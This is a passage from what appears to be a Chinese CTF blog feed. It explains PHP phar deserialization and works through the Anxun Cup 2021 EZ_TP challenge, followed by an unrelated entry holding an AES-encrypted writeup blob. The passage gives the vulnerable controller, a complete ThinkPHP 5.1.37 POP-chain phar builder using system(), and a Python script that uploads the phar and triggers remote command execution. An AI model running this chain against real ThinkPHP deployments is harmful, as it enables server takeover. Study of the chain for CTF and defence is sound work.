3a31 3520 4950 3a20 5b5d   06:53:15 IP: []</span></span><br><span class="line"><span class="string">00000020: 2c20 5245 5155 4553 543a 205b 5d2c 2043  , REQUEST: [], C</span></span><br><span class="line"><span class="string">00000030: 4f4e 5445 4e54 3a20 5b5f 5f5f 5f5f 5f5f  ONTENT: [_______</span></span><br><span class="line"><span class="string">00000040: 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f  ________________</span></span><br><span class="line"><span class="string">00000050: 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f  ________________</span></span><br><span class="line"><span class="string">00000060: 5f5f 5f5f 3030 3030 3634 3400 0000 0000  ____0000644.....</span></span><br><span class="line"><span class="string">00000070: 0000 0000 0000 0000 0000 0000 3030 3030  ............0000</span></span><br><span class="line"><span class="string">00000080: 3030 3030 3032 3400 3134 3134 3636 3337  0000024.14146637</span></span><br><span class="line"><span class="string">00000090: 3133 3300 3030 3233 3534 3320 3000 0000  133.0023543 0...</span></span><br><span class="line"><span class="string">000000a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>不只是tar，还有别的格式：</p><p><img src="https://img2020.cnblogs.com/blog/1335480/202111/1335480-20211128132908415-691764041.png"><br><a href="https://www.php.net/manual/zh/phar.converttoexecutable.php">https://www.php.net/manual/zh/phar.converttoexecutable.php</a></p><p>对应的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">convertToExecutable</span>(<span class="title class_">Phar</span>::<span class="variable constant_">TAR</span>,<span class="title class_">Phar</span>::<span class="variable constant_">BZ2</span>);<span class="comment">//会生成xxxx.phar.tar.bz2</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">convertToExecutable</span>(<span class="title class_">Phar</span>::<span class="variable constant_">TAR</span>,<span class="title class_">Phar</span>::<span class="variable constant_">GZ</span>);<span class="comment">//会生成xxxx.phar.tar.gz</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">convertToExecutable</span>(<span class="title class_">Phar</span>::<span class="variable constant_">ZIP</span>);<span class="comment">//会生成xxxx.phar.zip</span></span><br></pre></td></tr></table></figure><hr><h3 id="POP链"><a href="#POP链" class="headerlink" title="POP链"></a><strong>POP链</strong></h3><p>POP(property oriented programming)，说白了就是经过一连串的魔术方法&#x2F;特殊方法调用达到特定目的的一种攻击方式，本质是通过在调用这些方法的过程中又触发了别的特殊方法，引发连锁反应直到触及目标。phar反序列化使得不存在unserilize函数时这样的攻击也能成功，这正是所谓“扩大攻击面”。我们以刚刚结束的安洵杯2021 EZ_TP为例子。</p><p>网站使用ThinkPHP V5.1.37，网上已有现成的<a href="https://blog.csdn.net/lllffg/article/details/116145918">POP链</a>，现在需要我们在没有unserilize函数的情况下完成反序列化攻击。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;style type=&quot;text/css&quot;&gt;*&#123; padding: 0; margin: 0; &#125; div&#123; padding: 4px 48px;&#125; a&#123;color:#2E5CD5;cursor: pointer;text-decoration: none&#125; a:hover&#123;text-decoration:underline; &#125; body&#123; background: #fff; font-family: &quot;Century Gothic&quot;,&quot;Microsoft yahei&quot;; color: #333;font-size:18px;&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.6em; font-size: 42px &#125;&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:) &lt;/h1&gt;&lt;p&gt; ThinkPHP V5.1&lt;br/&gt;&lt;span style=&quot;font-size:30px&quot;&gt;12载初心不改（2006-2018） - 你值得信赖的PHP框架&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://tajs.qq.com/stats?sId=64890268&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://e.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;think id=&quot;eab4b9f840753f8e7&quot;&gt;&lt;/think&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="variable">$hello</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;Welcome to D0g3&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>])||<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;hello&#x27;</span>])) <span class="keyword">exit</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;world&#x27;</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_ invoke__">parse_str</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;world&#x27;</span>],<span class="variable">$haha</span>);</span><br><span class="line">            <span class="title function_ invoke__">extract</span>(<span class="variable">$haha</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$a</span>)) &#123;</span><br><span class="line">            <span class="variable">$a</span> = <span class="string">&#x27;hello.txt&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$hello</span>);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;hello.txt&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>parse_str()和extract()使得我们可以通过变量覆盖完成文件写入与任意读取，并且$a可以使用伪协议。那么接下来的事情就理所应当了：往hello.txt里写入一个phar，metadata里面放ThinkPHP 5.1.37 的反序列化利用链，完成RCE.(关于这个POP链的原理请参阅<a href="https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp-5.1.37-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html">https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-反序列化漏洞/Thinkphp-5.1.37-反序列化漏洞.html</a> 讲的很详细)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">append</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;append = [<span class="string">&quot;ethan&quot;</span>=&gt;[<span class="string">&quot;godspeedyyds&quot;</span>,<span class="string">&quot;xtxyyds&quot;</span>]];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;data = [<span class="string">&quot;ethan&quot;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Request</span>()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Request</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$hook</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$filter</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">            <span class="string">&#x27;var_method&#x27;</span>       =&gt; <span class="string">&#x27;_method&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;_ajax&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;var_pjax&#x27;</span>         =&gt; <span class="string">&#x27;_pjax&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;var_pathinfo&#x27;</span>     =&gt; <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;pathinfo_fetch&#x27;</span>   =&gt; [</span><br><span class="line">                <span class="string">&#x27;ORIG_PATH_INFO&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;REDIRECT_PATH_INFO&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;REDIRECT_URL&#x27;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&#x27;default_filter&#x27;</span>   =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;url_domain_root&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;https_agent_name&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;http_agent_ip&#x27;</span>    =&gt; <span class="string">&#x27;HTTP_X_REAL_IP&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;url_html_suffix&#x27;</span>  =&gt; <span class="string">&#x27;html&#x27;</span>,</span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$param</span> = [<span class="string">&#x27;cat /y0u_f0und_It&#x27;</span>];</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;config = [<span class="string">&quot;var_ajax&quot;</span>=&gt;<span class="string">&#x27;&#x27;</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;hook = [<span class="string">&quot;visible&quot;</span>=&gt;[<span class="variable language_">$this</span>,<span class="string">&quot;isAjax&quot;</span>]];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">concern</span>\<span class="title class_">Conversion</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;files = [<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>\<span class="title class_">Windows</span>;</span><br><span class="line">    <span class="variable">$w</span> = <span class="keyword">new</span> <span class="title class_">Windows</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$p</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line">    <span class="variable">$p</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$p</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line">    <span class="variable">$p</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$w</span>);</span><br><span class="line">    <span class="variable">$p</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;12345&quot;</span>);</span><br><span class="line">    <span class="variable">$p</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行后生成phar，然后执行脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;phar.phar&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    s = f.read()</span><br><span class="line"></span><br><span class="line">s = urllib.parse.quote(base64.b64encode(s).decode())</span><br><span class="line"><span class="comment"># print(s)</span></span><br><span class="line">remote = <span class="string">&#x27;&lt;here_is_remote_ip&gt;&#x27;</span></span><br><span class="line">sess =requests.session()</span><br><span class="line">r = sess.post(</span><br><span class="line">    url = <span class="string">f&#x27;http://<span class="subst">&#123;remote&#125;</span>/index.php/index/index/hello&#x27;</span>,</span><br><span class="line">    params=&#123;</span><br><span class="line">        <span class="string">&#x27;ethan&#x27;</span>:<span class="string">&#x27;&lt;here_is_your_shell_command&gt;&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;world&#x27;</span>:<span class="string">f&#x27;hello=<span class="subst">&#123;s&#125;</span>&amp;a=phar://./hello.txt&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>成功RCE</p><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>phar反序列化提供了一种扩展反序列化漏洞攻击面的方式、入口，所以基于unserialize()函数的各类攻击tricks（比如引用绕过之类的）依然适用。鉴于phar反序列化漏洞设计版本较多，相信CTF比赛中它仍然会稳定出场。</p><hr><p>参考资料：</p><p><a href="https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp-5.1.37-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html">Thinkphp-5.1.37-反序列化漏洞</a></p><p><a href="https://www.php.net/manual/zh/class.phar.php">https://www.php.net/manual/zh/class.phar.php</a></p><p><a href="https://blog.csdn.net/lllffg/article/details/116145918">Thinkphp 5.1.37反序列化漏洞</a></p><p><a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf">us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It</a></p><p><a href="https://github.dev/php/php-src">https://github.dev/php/php-src</a></p><p><a href="https://www.webhek.com/post/packaging-your-php-apps-with-phar.html">packaging-your-php-apps-with-phar</a></p><p><a href="https://www.freebuf.com/articles/web/205943.html">PHAR反序列化拓展操作总结</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Phar </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WriteUp 日哭school-bus 上了那个writeup</title>
      <link href="/2021/11/09/WriteUp%20%E6%97%A5%E5%93%ADschool-bus%20%E4%B8%8A%E4%BA%86%E9%82%A3%E4%B8%AAwriteup/"/>
      <url>/2021/11/09/WriteUp%20%E6%97%A5%E5%93%ADschool-bus%20%E4%B8%8A%E4%BA%86%E9%82%A3%E4%B8%AAwriteup/</url>
      
        <content type="html"><![CDATA[<p>密钥请找本人索取^_^<br>AES CBC Zero padding 128bits&#x2F;block IV&#x3D;0  UTF-8<br>qboAHUOHL+uw94b2elojCJWHWKwqPtIwFzSDKPZqmHPSu0APpp7H0ibcQNIUgrwDCCwdydqP+T74+slwNh6PM4GTvT1CoF2thGIZi5yCS9HfleGi5hP58rxFM3HzQxaU9EcxOEYbtGObactrCOzKP&#x2F;+tPittHwWWiL5uEQyt8ESrZlgr19O5mtM4zrkRoODCUtcna5XWuatk94T60ToF6ZrhqTb5v60dcwGjw3Zf1xaBRvYR2HltlogOzs&#x2F;QoLrDm&#x2F;gzGqxvddGPCaOEkF5nCzk4un7sl6RJD77GVxRA4IqYMSExrw&#x2F;By3bqLJyL+3waQihC4E3teqyknbLGbYCtF5VKV32WmE8H0hEyP0KkpO6MTJBiz4mziI3M0+pmoTXIRiBSpISAGq7RbKMIs2cOFD7Baxx+vUXuCShr7ZExYTi3bHD3r435&#x2F;F4WXA9NuFaNM5Lhu+rmFBRobYZ2Ur3BBIFDlTT6gI5XXgoVj9qhHx5DJWFlGcglkgefiabVxUmTFFohZPLnpJxGJByTi6Frw+epqfZkrY0eGTMPIBKcwQDqh1DnPDyxm+64Xr5fffzpmG&#x2F;HNyq8Nsa1qpk8Yw+Vu4l03oDZ9CX0msubse852dj0ySNKgYXSOKnYet8jdjSC2eVd14nypMuok1BPUoHMv4rlme813n&#x2F;lE8LehT5xRF8R+HFyxfsRb354Xr39YX5DpI61tS41P1A+IiXbWvGG7kUk7Ln4mV+UJe6FEWzNzD5f0o3thGCoYd7ccyUrVJTbFsnbz7wuCmWS9dFkx3QAOxkGcbgyPh9NtbkcfKYa&#x2F;znW6GibzQf3NQZ2W4jQl&#x2F;wEtVPMs1BzweyAI3XGoJy7ZdHrvrswzdSq9rrcJLYW8TLG4lCowCRwb0gx1d9RptT4Tnj15poEl3zW66+L9dSb6RxTgsWrh0MM20xHmLmAEkoVG5QtGpZjQUIiKrq2BDahZtKWQayM1c+x8PtdZysfGYxyW+nzq&#x2F;frGKmEKwo8GMqiLwevXk1aLryVVf57ofS56w+cyYAwmJtJ3ZKyeV26k4+WkV7EHBrTbItrz8EG8uP1eTzz922bAOhdWVck80iAc2QeolUYa6Ohp4GPP0tN2Q+CtBuPgjaPERjt42ZfhmstjJ9OoOiFObtUH72Rvg0i8aK+NsaSM48jxxuCJ8atXf57uu6giunfmaGaQ8fbdd395Sq7mTbvUiTVEn9tQX23xYfKcpnHSPMGfdcmeL5LdYg153QHLRLJ79&#x2F;vFbTKt6iLLbcImzlNgs70xE78rKHG3YFrrGwd41&#x2F;DSOxLqHYE5tiHkb32Haoy+&#x2F;d6NAAzahYrhx2x28DVDmJbotGIEjpCw4hvWSwAkT3toy0aRE5XpVpzzqXqxaSTteM+Vifzr&#x2F;+zynUM7SUwbMvONbqyhqC6tKtYtEOFoknu80e20Id7Ja9nfWH8s0Z7iWeb0p&#x2F;8i5yHvZVuuYFnDkcOz1z7VGmi6B7W2KTp9BWcjTupzxH+pnoGV+hMUHFiBoYrZJzt5bFpvOzEYJDHhq4oh8jxZMeKADJBwDfoNFaBeN2tVS93HJ1tT18YwI4BsxiDjBuX351JfepxVrP0d0DNlT&#x2F;rYgCyeXzIiz244JReySuLe6mALcEg0htTn7oZt6yONG1LVq8mfQ6GXrSqIaeBbNrfP3FF7C+7Vri45CvV39Rnt9y2r3eKdOW2VGf+8XZ8JBWKwpT65u1lKxim+FDxxmqxY1nStKtm3v6K5FtcsBz3LmNBJPB9oaILV10XWIPVVOpgD4MwV4XFT&#x2F;vpgoVhL0Det0atbj1KBG8A0dhLZwcWx72l&#x2F;yuAoCLuMoXciNPsVmngkkuCFVEziPxgPqVfPQTbGQbk4raRfOkCbkK5nAS4MTeEfr61fvQwYVXPYRTXDx1DWbTUABHbG0e5f8OG7fKNpC8c8m94sZM6osTLAdus73OC5Lj&#x2F;iHsOYgjfkW1KRnL7W5b2UOdNgUVyQueSNBmQEw4sW9J5+LWYd4NRE0qL8TLrjhL26u6L6RBVMEJomjcAQnOBGIiBVl4jSAgt1HcpnDn7JyV95Th5pPEJ7YGtgLkBkuvIpiIW9sGLwWJsWkJwQXyFTSxMaJeaxyz6q725nxYXrIXIq7uGUJrDaN60GNnwgL&#x2F;swzqqlmF0gdorXScCHc06roB+27rYV3kEEguhmsyoyxHdX4J33BEXeqigi3JaTrsVafApgIKZYhN&#x2F;uH5UKHgZ4Xr8Qq&#x2F;aTVcnv8ovm6jwTZRnQFCZaPKQ995TL5Rfm8gF4ejv32i2g&#x2F;0F1bxwJ3sqYCEo4cDtsWXeAY9pidVji6BHZ25oSuiYb2G7TBpfoo26Ey8e4l5zM0KRgeBmk6g3iXILfY6DH71fjzptJ+H4I5anThAZMycGTkr7UzknBxCluU98JK4WQnU3klY4E4ZZbHrYGmO3UwRxEzyqfFVB4JFSDbuWy4OJzmDCX+LFMAD5PfOKIDAIQ1Skm6j&#x2F;UqPXoVIZelOk0A57WCZ+&#x2F;eP0O5fpc1JhtkPkvfr7yQjFIHtRbJb2toReQxHtLvrFhAyBvC28xxI63fX&#x2F;C1At2u3agpy4KnUzAwdVAUVq9f2DjxTkrh3btk83i8aLG2QQvg6DCr7KB9Tw4exkc6MMxtjtpbwgZx0dLsh&#x2F;SyYBTRs+LgsfsBLVg5FhviLay+47uuXl6CQBZHQXcBl8LmRxOrYsHQnkgQ1qBpl7uJO5ru1rTMdbDP4+TSoxNcUEFZcHal0Baz4Srikc447dhDkvPtnEdIdxJEN5xnbHqd0EsE1f3Dn2vQLcQ7BeYWWUGLCdLte95y6EdYvL1r96Ggqv6izkQ&#x2F;aImw5Hif5KPuGt1Og8GPPlywv8wIDpi&#x2F;7V2Xw1FCOuJXSQRJjoKow87AcpKmmjKEHew0QdI6cOEBDwZki5bjFA9j6LW3NckoFOu7QTaA5alDsTWKJMnwHEN6Mn3IfoPVs7bqM9q6sPmDyoVUd8AjgA2iYkaJlS8TcXqWLl7z&#x2F;4F5GjmmV7a9hcY&#x2F;ClYN7zhagdUaFakLKkw0ngzsjZP45&#x2F;Hn0HWUfDH7NaLLovWi&#x2F;wKXYqrrMZkvKqVDhSD4U57zKCS05tBg0jqoW2digZPvzHJHDq2UV5o&#x2F;9MaIyTPgzU7JhUTrKOD+HzX3ZYvsFrmUfx9eiCVK57OkxfDGrzmVCgjX9ZIn2r0UzEbI1mfjHq75DiES38S2g67ypcnjnX4&#x2F;o2qmHI9GR7xzsB70Ol96WGcoOvYn2v6&#x2F;ldWx8dGOBRiTXUWve4jgtdCWupi4O8AikIhktX8sTJ+VBEhNr9negjA+FQj3y1xaPYl4LTyzpgiaeIDBUZnyt8Lgl&#x2F;fi&#x2F;Nm12nQDhE2vEJ3R2cjciLWG50b6U+9r94bS0nzbY0uupbI+fep8DE7ty4NHo0TtFF&#x2F;58f49MEj7c56AWzLGanI+OnYqYJ7w5tCbhY4V01jYYwEX6Ur0GWOZvsmOeR1kCSMLVWRcNipjOBr8LA9JeTfVr0WPyvl4rBD0RJ2ITrP3jn85iHVYMUCmTiXaav6poh1+WCPYM2J9q4bdwK1TBxX2vBCv33t&#x2F;e6wABwqh5wsy1APhgzL1ZTZrSsnCNfnPXbJXtWCaexkYF58gRZ3+I2XZgYvmj37TT53qhayl7sNImuGLFWuWVH0um+ldqP1u0joF+&#x2F;BiJTD1gbgtSE+HW3r+Ntd5OgQBbXHhy54d4ABucD7RqFS95GlwadZV6v4AjJFKFYh1rnDZHKVDT9Ux301iTmwFvPatYPwCyJAmJ4bndBzhmwDl&#x2F;yU8KFuZ8zbA8yUr5nrtSu9A&#x2F;I6rsRtMdKQTJMRZ4iL5s1zmZTzPVF1&#x2F;VOoqIVLP8kDtuyyxVXGUcufl6nIHCYoQlbvvXQV3TWIlnut2uWxuedeTuOS3vQj1JDnmkEnc&#x2F;BmjeY2zGFgxtDpTjwW&#x2F;Eh9SFJq9ZctkGkPdwrXCXr+DThhguEGXS7fGJeScW5fN0&#x2F;u1w&#x2F;V4c4VW9&#x2F;GNDBZRuG6AyUjEjVABlBj4fER+2vhhzgnzhTnh+j5qNpMFy7Jhd0gmLgdywSUTrK2U96l9tcZYnIMOnLlAzinaqDauE9KigK+x4tWxEW9LMmfCsmV72BRaIpx8xrrmvaF0DYLKCqxvY3SdCU3YIxA6iIMhShTN15M6znJzq8kufcm6FJ+iO6bzDnDLSwdUteGfQCgHKAK4S&#x2F;NPsChjP5OB&#x2F;qWZsq1KCFTUh1+04E+F2oHfwMUitqLV1blL4KPUeImUx0ldbeXHtEMxHwWX9CQbU2Ksd9iyCB9oye4ANR5FDpYJBC5Yvb9SAMW18zT99I2FfS6S5umUDm&#x2F;uTR0V3fAjWMDwwjhuWH9YZRqOADr9UXNHdJn5M4MagfplbfBdWWiU0Waxc+14EZkX0&#x2F;62UKO5YyZzkHrv2X0jckDbGFuG29fY6PJOnmY+UN6JhOJ52OfrjR4KIrp2SORgHzEUqD6YzF8zhmBsMZ8AY9&#x2F;GMAGLbV1zhbuI